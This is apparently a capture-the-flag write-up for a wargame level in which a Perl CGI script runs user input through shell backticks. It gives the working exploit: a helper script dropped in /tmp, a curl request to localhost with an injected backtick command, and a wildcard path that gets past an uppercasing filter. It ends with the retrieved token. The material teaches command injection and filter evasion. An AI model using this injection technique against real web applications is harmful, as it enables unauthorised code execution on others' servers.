# level12

The home directory only contains `level12.pl`

The program uses backticks to evaluate a shell script that contains user input.

We can exploit this and evaluate the code contained in the `$xx` variable.

But it contains regexes that delete everything after a space & make everything uppercase (x="`getflag>/tmp/token`" -> x="`GETFLAG>/TMP/TOKEN`").

```bash
echo 'getflag > /tmp/flag' > /tmp/SCRIPT
chmod +x /tmp/SCRIPT
curl 'localhost:4646?x="`/*/script`"' # We use a wildcard because /tmp would become /TMP
cat /tmp/flag
# Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
